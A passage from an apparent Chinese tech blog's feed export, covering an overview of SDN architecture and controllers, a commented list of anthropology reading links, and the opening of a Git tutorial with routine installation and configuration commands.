<h4 id="Google-的-SDN-实践"><a href="#Google-的-SDN-实践" class="headerlink" title="Google 的 SDN 实践"></a>Google 的 SDN 实践</h4><p>Google 基于 SDN 技术改造其骨干网 G-scale（Backbone Network，也称WAN网）。WAN网的主要任务是负责全球12个数据中心之间的互联，数据流量的内容包括：1. 用户数据备份，例如视频、图片、语音等；2. 跨数据中心存储访问，例如计算资源和存储资源分布不同；3. 大规模的数据同步。WAN 网成本高昂（包括很多海底光缆），而且存在数据流量大但是链路带宽利用率低的问题：为了实现负载均衡，同时避免大流量都被分发到同一个链路上导致丢包，Google不得不使用过量链路，提供比实际需要多得多的带宽，实际链路带宽利用率只有30%~40%，而且仍不可避免有的链路很空闲，有的链路产生拥塞，设备必须支持很大的包缓存，成本高。为了增强网络的可管理性，Google 首先在带宽分配和路径计算方面尝试。解决思路是当一个新的数据要开始传输时，应用程序会评估所需要耗用的带宽，为它选择一条最优路径（如负载最轻但非最短路径，虽不丢包但延时大），然后把这个应用对应的策略通过控制器（Controller）下发到定制的交换机中，跟选择的路径绑定在一起，从而整体上使链路带宽利用率达到最优。</p>
<p>SDN 架构中最显著的一个特点就是采用集中式控制器（Controller）：<br><img src="http://riboseyim-qiniu.riboseyim.com/SDN_Solutions_201708.png" alt=""></p>
<h2 id="SDN-Architecture"><a href="#SDN-Architecture" class="headerlink" title="SDN Architecture"></a>SDN Architecture</h2><p>SDN在应用中大体上可以可以划分为三层体系结构：</p>
<ul>
<li>应用层（Application Layer）</li>
<li>控制层（Control Layer）</li>
<li>基础设施层（Infrastructure Layer）</li>
</ul>
<p>不同层次之间通过接口通讯：</p>
<ul>
<li>北向接口（Northbound interface）</li>
<li>南向接口（Sorthbound interface）</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SDN_Arch_OpenFlow_201708.png" alt=""></p>
<h4 id="控制层（-Control-Layer-）"><a href="#控制层（-Control-Layer-）" class="headerlink" title="控制层（ Control Layer ）"></a>控制层（ Control Layer ）</h4><p>控制层是 SDN 控制器管理网络的基础设施，可以根据需要灵活选择多种控制器。<br>在这一层中，控制器中包含大量业务逻辑，以获取和维护不同类型的网络信息、状态详细信息、拓扑细节、统计详细信息等。<br>由于 SDN 控制器是用于管理网络的，所以它必须具有用于现实世界网络使用情况的控制逻辑，如交换、路由、二层VPN、三层VPN、防火墙安全规则、DNS、DHCP和集群，网络供应商和开源社区需要在自己的 SDN 控制器中实现自己的服务。这些服务会向上层（应用层）公开自己的API（通常是基于 <a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">REST</a> ，这使网络管理员可以方便地使用应用程序上的 SDN 控制器的配置、管理和监控网络。</p>
<p>目前市场上的 SDN 控制器解决方案大致可以分为两类：大型网络设备厂商提供商业方案，例如 Cisco Open SDN controller, Juniper Contrail, Brocade SDN controller, 和来自 NEC 公司的 PFC SDN controller ；社区组织提供的开源方案，例如 OpenDaylight, Floodlight, Beacon, Ryu 等等。</p>
<p>Commercial Solutions:</p>
<ul>
<li><a href="https://www.cisco.com/c/en/us/products/cloud-systems-management/open-sdn-controller/index.html">Cisco Open SDN Controller</a></li>
<li><a href="https://www.juniper.net/us/en/products-services/sdn/contrail/">Juniper Contrail</a></li>
<li><a href="http://www.luminanetworks.com/products/?utm_source=brocade&amp;utm_medium=redirect&amp;utm_campaign=launch">Brocade SDN controller</a></li>
<li><a href="https://www.necam.com/sdn/Software/SDNController/">PFC SDN controller(From NEC)</a></li>
</ul>
<p>Open Source Solutions:</p>
<ul>
<li><a href="https://www.sdxcentral.com/projects/beacon/">Beacon</a>：由斯坦福大学开发，Java语言编写</li>
<li><a href="http://www.projectfloodlight.org/floodlight/">Floodlight</a>：源于<a href="https://www.sdxcentral.com/projects/beacon/">Beacon</a>，Big Switch Networks开发，Java语言编写，Apache许可证</li>
<li><a href="https://www.opendaylight.org/">OpenDaylight</a>：</li>
<li><a href="http://osrg.github.io/ryu/">Ryu</a>：由 NTT 开发，Python 编写，能够与 OpenStack 平台整合，控制器API丰富</li>
<li><a href="#">Mul</a>: 由 Kulcloud 开发，内核采用 C 语言实现的多线程架构</li>
<li><a href="#">NodeFlow</a>: 由 Cisco 开发，基于 Node.js 的 <a href="https://riboseyim.github.io/2017/08/22/SDN-OpenFlow/">OpenFlow</a> 控制器，JavaScript 编写</li>
<li><a href="#">Trema</a>: 由 NEC 开发，Ruby/C 编写</li>
<li><a href="#">NOX</a>: 由 Nicira 开发，C++/Python编写，业界第一款 <a href="https://riboseyim.github.io/2017/08/22/SDN-OpenFlow/">OpenFlow</a> 控制器</li>
<li><a href="#">POX</a>: 由 Nicira 开发，是 NOX 的纯 Python 实现版本，目的是提供跨平台部署的便利性</li>
</ul>
<h4 id="基础设施层（-Infrastructure-Layer-）"><a href="#基础设施层（-Infrastructure-Layer-）" class="headerlink" title="基础设施层（ Infrastructure Layer ）"></a>基础设施层（ Infrastructure Layer ）</h4><p>基础设施层，由各种网络设备构成。它可以是数据中心的一组网络交换机和路由器。控制层负责管理底层物理网络，物理层的实现可以是支持 OpenFlow 的硬件交换机，随着虚拟化技术的完善，SDN 交换机可以是软件形态，例如 <a href="http://openvswitch.org">Open vSwitch (OVS)</a> 就是一款基于开源技术实现的、能够与服务器虚拟化（Hypervisor）集成，具备交换机的功能，可以实现虚拟化组网。另外，OVS 支持传统的标准管理接口，例如 NetFlow 、sFlow 等，监测虚拟环境中的流量情况，详见 <a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">《浅谈基于数据分析的网络态势感知》</a> 。</p>
<h4 id="应用层（-Application-Layer-）"><a href="#应用层（-Application-Layer-）" class="headerlink" title="应用层（ Application Layer ）"></a>应用层（ Application Layer ）</h4><p>应用层对于开发者来说是开放区域，鼓励开发尽可能多的创新应用。包括网络的可视化：拓扑结构、网络状态、网络统计等；网络自动化相关应用：网络配置管理，网络监控，网络故障排除，网络安全策略等。SDN 应用程序可以为企业和数据中心网络提供各种端到端的解决方案。</p>
<p>例如，Brocade 应用实例：</p>
<ul>
<li>Brocade Flow Optimizer</li>
<li>Brocade Virtual router</li>
<li>Brocade Network advisor</li>
</ul>
<p>HPE 应用实例：</p>
<ul>
<li>HPE Network Optimizer</li>
<li>HPE Network protector</li>
<li>HPE Network visualizer</li>
<li>NEC UNC for HP SDN VAN Controller</li>
<li>Aricent SDN Load balancer</li>
<li>TechM smart flow steering</li>
<li>TechM server load balancer</li>
</ul>
<h4 id="南向接口（-Southbound-interface-）"><a href="#南向接口（-Southbound-interface-）" class="headerlink" title="南向接口（ Southbound interface ）"></a>南向接口（ Southbound interface ）</h4><p>控制层到基础设施层（网络交换机）通讯需要经过南向接口，目前主要的协议是 OpenFlow , NetConf，OVSDB 。 OpenFlow 协议是事实上的国际行业标准，NOX 、Onix 、Floodlight 等都是基于 OpenFlow 控制协议的开源控制器。作为一个开放的协议，OpenFlow 突破了传统网络设备厂商各自为政形成的设备能力接口壁垒。</p>
<h4 id="北向接口（-Northbound-interface-）"><a href="#北向接口（-Northbound-interface-）" class="headerlink" title="北向接口（ Northbound interface ）"></a>北向接口（ Northbound interface ）</h4><p>北向接口：应用层 通过 API 的方式 与 SDN 控制器通讯。与南向接口不同，现在北向接口还缺少业界公认的标准，实现方案思路有的从用户角度出发、有的从运营商角度出发、有的从产品能力角度出发。技术风格上，部分传统的网络设备厂商倾向于在现有的设备上提供编程接口供业务App调用，许多上层应用的开发者也比较倾向于采用 <a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">REST API</a> 接口的形式。</p>
<h4 id="SDN-世界的两大山头"><a href="#SDN-世界的两大山头" class="headerlink" title="SDN 世界的两大山头"></a>SDN 世界的两大山头</h4><p>SDN 技术体系目前还处于激烈竞争阶段，相关新产品和新技术层出不穷，如果要梳理大致可以分为两个流派：</p>
<ul>
<li><p>ONF(Open Networking Foundation，开放网络基金会 )<br>董事会成员：德国电信（DT）、Facebook、 Google, Microsoft、Verizon、Yahoo!、日本 NTT 电信、高盛公司<br>特点：面向用户</p>
</li>
<li><p>传统巨头大联盟（通过Linux基金会(Linux Foundation)合作）<br>成员：思科（Cisco）、IBM、 微软、Big Switch、博科、思杰、戴尔、爱立信、富士通、英特尔、瞻博网络、微软、NEC、惠普、红帽和VMware<br>协作项目：<a href="https://www.sdxcentral.com/sdn/definitions/opendaylight-project/">OpenDaylight（20130408）</a><br>特点：大厂控制“嫌疑”</p>
</li>
</ul>
<h4 id="SDN-标准化组织"><a href="#SDN-标准化组织" class="headerlink" title="SDN 标准化组织"></a>SDN 标准化组织</h4><ul>
<li><p>IETF（Internet Engineering Task Force，互联网工程任务组）<br>相对 ONF 而言，更多是由网络设备厂商主导，已经发布了多篇 <a href="https://riboseyim.github.io/2017/05/12/Protocol-RFC/">RFC</a> 文稿，内容涉及需求、框架、协议、转发但愿模型及 MIB 等。</p>
</li>
<li><p>ETSI NFV(Network Functions Virtualisation)<br>成员：欧洲电信标准协会（European Telecommunications Standards Institute，ETSI）包括 AT&amp;T, 英国电信（BT）, 德国电信等<br>特点：主要工作成果是 “网络功能虚拟化白皮书”，对NFV的定义、应用场景、基本功能，以及SDN等技术的关系等内容进行描述。</p>
</li>
<li><p>ITU-T （国际电信联盟通信标准化组织）<br>由 ITU-T 指定的国际标准通常被称为建议（Recommendations）,2012年开始 SDN 与电信网络结合的标准研究。</p>
</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SDN_Ecosystem.png" alt=""></p>
<h2 id="SDN-与网络安全-（待补充）"><a href="#SDN-与网络安全-（待补充）" class="headerlink" title="SDN 与网络安全 （待补充）"></a>SDN 与网络安全 （待补充）</h2><h4 id="高可用性支持"><a href="#高可用性支持" class="headerlink" title="高可用性支持"></a>高可用性支持</h4><ul>
<li>如果 SDN 控制器只配置了一条源和目的路径，一旦链路失效如何快速将流量路由到正常链路？（持续监控网络拓扑、实时性）</li>
<li>外部连接的高可用性，支持VRRP（Virtual Router Redundancy Protocol）, MC-LAG(Multi-Chassis Link Aggregation Group)等</li>
<li>如何避免控制器成为新的单点故障源？（硬件、软件冗余设计，控制器集群化（OpenFlow v1.2开始引入），控制器集群同步能力）</li>
</ul>
<h4 id="企业级的授权和隔离"><a href="#企业级的授权和隔离" class="headerlink" title="企业级的授权和隔离"></a>企业级的授权和隔离</h4><ul>
<li>支持企业级的授权和认证</li>
<li>确保租户能在共享的网络基础资源上获得完全隔离的虚拟网络</li>
</ul>
<h4 id="抗恶意攻击能力"><a href="#抗恶意攻击能力" class="headerlink" title="抗恶意攻击能力"></a>抗恶意攻击能力</h4><ul>
<li>需要具备对控制类通讯的流量限制，怀疑被攻击是的告警能力</li>
</ul>
<h2 id="Discuss"><a href="#Discuss" class="headerlink" title="Discuss"></a>Discuss</h2><ul>
<li><a href="http://www.infoq.com/cn/articles/cloud-data-center-network-and-security-technology-solutions?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">云数据中心网络分析及安全技术方案实践(DPDK是一组快速处理数据包的开发平台及接口) | 王凯@云杉网络研发部 </a></li>
<li><a href="http://www.csdn.net/article/2013-11-25/2817613">走近Google基于SDN的B4网络 | @盛科张卫峰</a></li>
<li><a href="http://www.jifang360.com/news/2012128/n966142974.html">863项目：未来网络体系结构和创新环境(FINE) | @清华大学-毕军</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA4Nzg5Nzc5OA==&amp;mid=400077810&amp;idx=1&amp;sn=95f4da1404d23aaa8d977a7b52dcc2d3&amp;scene=1&amp;srcid=1023P4qUPOLAD2K9sN9qyLFp#rd">百度：如何优化多数据中心的带宽成本？</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="SDN技术专题"><a href="#SDN技术专题" class="headerlink" title="SDN技术专题"></a>SDN技术专题</h4><ul>
<li><a href="https://riboseyim.com/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.com/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）：OpenFlow</a></li>
<li><a href="https://riboseyim.com/2017/10/16/SDN-Controller/">SDN 技术指南（三）：SDN Controller</a></li>
<li><a href="https://riboseyim.com/2017/10/13/SDN-OpenvSwitch/">SDN 技术指南（四）：Open vSwitch</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-NFV">SDN 技术指南（五）：NFV</a></li>
<li><a href="#">SDN 技术指南（六）：OpenStack or Kubernetes ? </a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-ORG/">SDN 技术指南（七）：标准化组织</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-CASE">SDN 技术指南（八）：案例教学</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-MOOC/">SDN技术指南（十）：在线课程推荐</a></li>
</ul>
<h4 id="网络编程专题"><a href="#网络编程专题" class="headerlink" title="网络编程专题"></a>网络编程专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
</ul>
<h4 id="网络安全专题"><a href="#网络安全专题" class="headerlink" title="网络安全专题"></a>网络安全专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security|香港拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="云计算专题"><a href="#云计算专题" class="headerlink" title="云计算专题"></a>云计算专题</h4><ul>
<li><a href="https://riboseyim.com/2017/07/23/CloudComputing/">AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://riboseyim.github.io/2017/08/18/SDN-ONOS/">资讯：三星主办 ONOS Build 2017</a></li>
<li><a href="https://www.sdxcentral.com/sdn/definitions/opendaylight-project/">What is the OpenDaylight Project (ODL)?</a></li>
<li><a href="http://www.csdn.net/article/2014-06-05/2820097-Scott-Shenker">对话大神Scott Shenker：从物理博士到SDN’s Uncle | CSDN,2014</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MzEzMTY0MA==&amp;mid=200439739&amp;idx=2&amp;sn=2e0dcb987bb6b093f57a0ecac1c86210&amp;scene=0#rd">新贵与遗老：被集群路由器和POS绑架的运营商网络 | 徐建锋</a></li>
<li><a href="http://jaseywang.me/2017/02/27/%e4%b8%80%e5%bc%a0%e5%a4%8d%e6%9d%82%e7%bd%91%e7%bb%9c%e7%9a%84%e7%94%9f%e9%95%bf%e8%bf%87%e7%a8%8b/">一张复杂网络的生长过程| jaseywang.me</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title>人类学(Humanics)</title>
    <url>/2017/04/21/Science-Humanics/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="人类学"><a href="#人类学" class="headerlink" title="人类学"></a>人类学</h2><h4 id="Master"><a href="#Master" class="headerlink" title="Master"></a>Master</h4><ul>
<li>弗朗斯•德瓦尔 [荷兰著名的心理学家、动物学家和生态学家]<br>主要著作:《共情时代》、《黑猩猩的政治》、《类人猿与寿司大师》、《灵长类动物如何谋求和平》、《人类的猿性》</li>
</ul>
<blockquote>
<p>唯一可以肯定的是，我们这个物种具有战争的潜能，这个苗头在某些特定环境下就会抬头。小冲突有时会失控爆发，结果引发血光之灾。再加上不管哪儿的年轻男性都喜欢显摆自己矫勇善战，他们会不顾后果地打击外族人，局势就会更加雪上加霜。不过同时，人类这个物种也有其独特之处，即使在同族人散布开很久之后，我们还会同亲人保持某种联系。结果，部族间就会维持一个完整的人际关系网络，这个网络的存在会促进经济交流，与此同时让战争变得非常没有建设性。同外族的联系相当于在不可知的环境中为活命提供了一项保险，如此一来，食物和水短缺的风险，就可以在各个族群间平摊了。</p>
</blockquote>
<h2 id="行为模型"><a href="#行为模型" class="headerlink" title="行为模型"></a>行为模型</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI0MjY0OTkxNw==&amp;mid=2247488530&amp;idx=2&amp;sn=8ee65c03d303afdaafe75c5983e30b2d&amp;chksm=e9784a40de0fc3567e4b9cf1673b8f58e3997be01c9cc7afbe169b9a5dc9b3ca8f181a6b70e2&amp;mpshare=1&amp;scene=1&amp;srcid=0818VZhKd5Ll5nyEU5dWgglA#rd" target="_blank" rel="noopener">动物世界，也遵循经济基本法 | 浪潮工作室@破壳翻译组</a></li>
<li><a href="http://songshuhui.net/archives/98098" target="_blank" rel="noopener">哺乳动物的私人生活，你选择妻妾成群，还是从一而终？|科学松鼠会@红色皇后</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MDI2NzQ1Mg==&amp;mid=202802459&amp;idx=1&amp;sn=97345db09767c325946db488027f11d8&amp;scene=1&amp;srcid=1031uflvkKxGxRJ2OPzcS1I5#rd" target="_blank" rel="noopener">光棍康德的幸福生活 | 冯晓虎</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDkzNjIwMg==&amp;mid=2651659863&amp;idx=3&amp;sn=cdbf62b8bb736aec37ee6819ff318f00&amp;chksm=8bbeb3b2bcc93aa4cd8786f9ea9b53a604264f1687b6be8752422a2f90c392b2fd55cb0c593b&amp;mpshare=1&amp;scene=1&amp;srcid=1214321D7NJrSSuDMNhPcL0F#rd" target="_blank" rel="noopener">单身女性的缺乏逼得维京人当了海盗 |Evolution and Human Behavior 论文推荐</a></li>
<li><p><a href="http://mp.weixin.qq.com/s/vxiuePIVW14sQo4oVI2QzA" target="_blank" rel="noopener">网文：台湾早期开发-光棍有关的一些材料</a><br>清廷《移民三禁》：渡台者不许携带家眷，这使台湾光棍巨多，称作“罗汉脚”，这些光棍又往往沦为游民。后来清代台湾的几次著名民变，如朱一贵事变、林爽文事变等，游民都起了主力作用</p>
</li>
<li><p><a href="https://mp.weixin.qq.com/mp/appmsg/show?__biz=MjM5ODAxNzEwMA==&amp;appmsgid=100071500&amp;itemidx=1&amp;sign=96a74473c8dd09f3eebe7b37057ebef9&amp;scene=1&amp;srcid=#wechat_redirect" target="_blank" rel="noopener">人类逃不出邓巴数|互联网分析沙龙</a></p>
</li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzQwNjcyMQ==&amp;mid=400775116&amp;idx=1&amp;sn=b837f806bc8bd9656ae52eefb5dea70c&amp;scene=1&amp;srcid=1116gCvWSvSNgpCbmrBHNZrb#rd" target="_blank" rel="noopener">超越邓巴数之七：暴力的垄断｜大象公会</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzQwNjcyMQ==&amp;mid=400419254&amp;idx=1&amp;sn=22bba1e632de8ca62b4871111e243c3a&amp;scene=1&amp;srcid=1104RTN3nXjxuJ0l0kT5XLZU#wechat_redirect" target="_blank" rel="noopener">超越邓巴数之六：武人的兴起｜大象公会</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzQwNjcyMQ==&amp;mid=400249193&amp;idx=1&amp;sn=e635687a06e7d375edeb006fdf800acc&amp;scene=1&amp;srcid=1027tIJhKCsjNIVZ6wkY9RG7#rd" target="_blank" rel="noopener">超越邓巴数之5：青春的躁动｜大象公会</a></li>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzQwNjcyMQ==&amp;mid=218492993&amp;idx=1&amp;sn=91c49a76eb408bb8cebd1086638e4131&amp;scene=1&amp;srcid=1010WusutpVccwiMAsiAaBlb#rd" target="_blank" rel="noopener">老人政治的意义-家长联盟-邓巴数 | 大象公会</a></p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzQwNjcyMQ==&amp;mid=200913345&amp;idx=1&amp;sn=234ab8bb91355051c49203a41e1f1892&amp;scene=1&amp;srcid=1110JyVRtFFZpNDbJXIoIdRt#rd" target="_blank" rel="noopener">男女关系之一：纠结的一夫一妻制｜大象公会@辉格</a></p>
</li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzQwNjcyMQ==&amp;mid=201129120&amp;idx=2&amp;sn=72a12c0f05475ce8ea33ef4aa6e7c884&amp;scene=1&amp;srcid=1110JDAOCiVhHU0kLFz1UpNX#rd" target="_blank" rel="noopener">男女关系之三：女性的性策略｜大象公会@辉格</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzQwNjcyMQ==&amp;mid=201129120&amp;idx=3&amp;sn=4ff8bc366817c6fe9325e37bc946efeb&amp;scene=1&amp;srcid=1110mJsAugDkZXfJO4SDgUf7#rd" target="_blank" rel="noopener">男女关系之二：男性性策略｜大象公会@辉格</a></li>
</ul>
<h2 id="关于传播学"><a href="#关于传播学" class="headerlink" title="关于传播学"></a>关于传播学</h2><ul>
<li><p><a href="https://mp.weixin.qq.com/s/SRWgJ5kFiPclKHoNJZWJbg" target="_blank" rel="noopener">魏方丹、李静思：下流才是内容创业的王道</a></p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MzI0MjY0OTkxNw==&amp;mid=2247486675&amp;idx=3&amp;sn=550ac966e0e2af89a0f04e2fa2966c0d&amp;chksm=e9785281de0fdb970dac279f361a8a199a2b5e043eb5a18f107984022049521af414bf299b4c&amp;mpshare=1&amp;scene=1&amp;srcid=0622ERdqAA2ZRxj0EaWEQ8Ct#rd" target="_blank" rel="noopener">破壳翻译组:色情广播瓦解铁血纳粹</a></p>
</li>
<li><p><a href="http://songshuhui.net/archives/95994" target="_blank" rel="noopener">​大灾之后，为何谣言盛行？ | 沉默的马大爷</a></p>
</li>
<li><a href="http://songshuhui.net/archives/94826" target="_blank" rel="noopener">怎样打造过硬的传谣队伍？（大误）| 破破的桥</a></li>
<li><a href="http://coolshell.cn/articles/17391.html" target="_blank" rel="noopener">为什么我不在微信公众号上写文章 | 酷壳</a></li>
</ul>
<h4 id="关于人群鄙视链"><a href="#关于人群鄙视链" class="headerlink" title="关于人群鄙视链"></a>关于人群鄙视链</h4><ul>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzQwNjcyMQ==&amp;mid=2651010379&amp;idx=1&amp;sn=57b98c68376143ea04efc4da9271cfe9&amp;chksm=bd2de4258a5a6d3391904e6a594307cea5defbc3283997f0481ceaec8b28231465447b49a8d4&amp;mpshare=1&amp;scene=1&amp;srcid=0516qDCDlcKF330KHxZ2K5eT#rd" target="_blank" rel="noopener">大象公会@姚白莞：苏北到底在哪里</a></p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzQwNjcyMQ==&amp;mid=2651010379&amp;idx=2&amp;sn=36823dd0efbfee58c349de677e1801a0&amp;chksm=bd2de4258a5a6d333ae667b5e59b7875eaf99b50fce4e68de30bb67b648f3e8b503f6fa4b292&amp;mpshare=1&amp;scene=1&amp;srcid=0516beHnnzV6yG5DIo4Og3zp#rd" target="_blank" rel="noopener">大象公会@姚白莞：苏北人出汉奸？</a></p>
</li>
</ul>
<h2 id="生物多样性"><a href="#生物多样性" class="headerlink" title="生物多样性"></a>生物多样性</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/QvsX-WHQ6KEp6gJE1Mi_iQ" target="_blank" rel="noopener">杂交不仅帮濒危物种度过难关，还对新物种演化至关重要 | Quantamagazine,2017-07-19</a><br>杂交物种一度被视作生物的错误，但正是它默默拯救了大量处于困境中的物种。如何协调杂交现象与保护政策成为了科学界的一大挑战。</li>
<li><a href="http://www.sciencemag.org/content/early/2015/07/22/science.aac4315.abstract" target="_blank" rel="noopener">北美移民遗传基因分析，冰河晚期大型物种灭绝</a></li>
<li><a href="http://songshuhui.net/archives/96824" target="_blank" rel="noopener">有了生物技术，为什么还要担心物种灭绝？| 科学松鼠会@Ent</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjM1MzMyMQ==&amp;mid=400022067&amp;idx=1&amp;sn=ee86907a9fc1c2257d896ee9e92514f9&amp;scene=1&amp;srcid=1019LGjgfo8HIBJ9uZ6WdLN5#rd" target="_blank" rel="noopener">研究认为混种交配改变人类基因影响人类进化|Science</a></li>
</ul>
<h2 id="未经整理的一些碎片素材"><a href="#未经整理的一些碎片素材" class="headerlink" title="未经整理的一些碎片素材"></a>未经整理的一些碎片素材</h2><p>是这个意思：让财富变得透明会对社会福利产生不良影响，降低总体合作水平、社会关联以及整体财富。相比之下，贫富差异本身给社会福利带来的影响很少。</p>
<ul>
<li><a href="http://mp.weixin.qq.com/s/V-esKQU4lfSJTYsC8VijBw" target="_blank" rel="noopener">论文：财富透明与社会福利</a></li>
</ul>
<p>教练太牛了！我到现在都不明白，他自己都没拿过全国冠军，怎么就能预言我能拿世界冠军？——天下最好的教育都是师傅带徒弟，英雄识英雄、英雄惜英雄是也！</p>
<ul>
<li><a href="http://mp.weixin.qq.com/s/uYnGM5VgpSMDIQSNFiJdLg" target="_blank" rel="noopener">一般新闻：击剑冠军教练</a></li>
</ul>
<p>个人感觉人类基因像是一个彻底的分布式系统，人种或者其它动物都只是宿主，基因是被切片后分散于不同物种之间的。任何单一个体、种群、物种的灭绝都不足以影响地球的基因多样性，它具有很强的容灾和自演化能力。要不然怎么解释生命树总体上是进化的，而从来没有在生物灭绝中被一次次归零？？   基因证明人类一次性走出非洲，但不能解释人类文明<br><a href="http://mp.weixin.qq.com/s/fNM5aXXAmy8ZPkntQ2ERGQ" target="_blank" rel="noopener">论文：人类迁徙路线图</a></p>
<p>文明的优势是远程攻击，野蛮的优势是贴身肉搏。所以具有相对文明的人千万不要和野蛮人争论，这等于自己降维，会丢掉优势。又例如美帝就不怎么关心天朝火热的互联网+金融+航母运动，这对人家而如同吃饭、喝水一般平常，反而在超远程星际探索、大型无人系统、下一代世界治理体系等领域持续突破，以期在未来也能继续保持境界上的优势。</p>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Science</tag>
      </tags>
  </entry>
  <entry>
    <title>PM指南:源代码版本管理|工具与技术</title>
    <url>/2016/05/31/TeamWork-Git/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>思路：<a href="https://riboseyim.github.io/2017/08/28/Redology/">《红楼梦》的版本问题 </a></li>
<li>技术出版选题（Git）（电子工业出版社 | 2016）</li>
</ul>
<span id="more"></span>
<h2 id="《红楼梦》的版本问题"><a href="#《红楼梦》的版本问题" class="headerlink" title="《红楼梦》的版本问题 "></a><a href="https://riboseyim.github.io/2017/08/28/Redology/">《红楼梦》的版本问题 </a></h2><ul>
<li>甲戌本（名“至脂砚斋甲戌抄阅再评仍用石头记”）</li>
<li>己卯本（名“脂砚斋四阅评过，己卯冬定本”）</li>
<li>庚辰本（名“脂砚斋四阅评过，庚辰秋定本”）</li>
<li>俄藏本</li>
<li>程高本</li>
</ul>
<h2 id="代码分包"><a href="#代码分包" class="headerlink" title="代码分包"></a>代码分包</h2><ul>
<li>Perl:pm</li>
<li>Java:jar</li>
<li>Node.js:npm</li>
<li>Go:gvm</li>
</ul>
<blockquote>
<p>you can only really use Git if you understand how Git works.</p>
</blockquote>
<h2 id="Git-ABC"><a href="#Git-ABC" class="headerlink" title="Git ABC"></a>Git ABC</h2><h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/git/git/archive/&#123;tag&#125;.tar.gz</span><br><span class="line">gunzip &#123;tag&#125;.tar.gz</span><br><span class="line"><span class="built_in">cd</span> git-&#123;tag&#125;</span><br><span class="line">make configure</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">git clone git:<span class="regexp">//url</span></span><br><span class="line">git init-db</span><br><span class="line"></span><br><span class="line"><span class="comment">## config</span></span><br><span class="line">git config user.name <span class="string">&quot;your name&quot;</span></span><br><span class="line">git config user.email yourname@email_server</span><br><span class="line">git config core.editor vim</span><br><span class="line">git config core.paper <span class="string">&quot;less -N&quot;</span></span><br><span class="line">git config color.diff true</span><br><span class="line">git var -l 查看已经设置的配置</span><br></pre></td></tr></table></figure>
<p>Git 中的状态：</p>
<ul>
<li>HEAD 代表当前最新状态</li>
<li>tag  某个状态的标签</li>
<li>SHA1 每个提交的唯一标识</li>
</ul>
<p>Git 中有四种对象,都由 SHA1 值表示, .git 目录中保存了全部信息。</p>
<ul>
<li>blob 文件</li>
<li>tree 目录</li>
<li>commit 提交历史</li>
<li>tag 标签</li>
</ul>
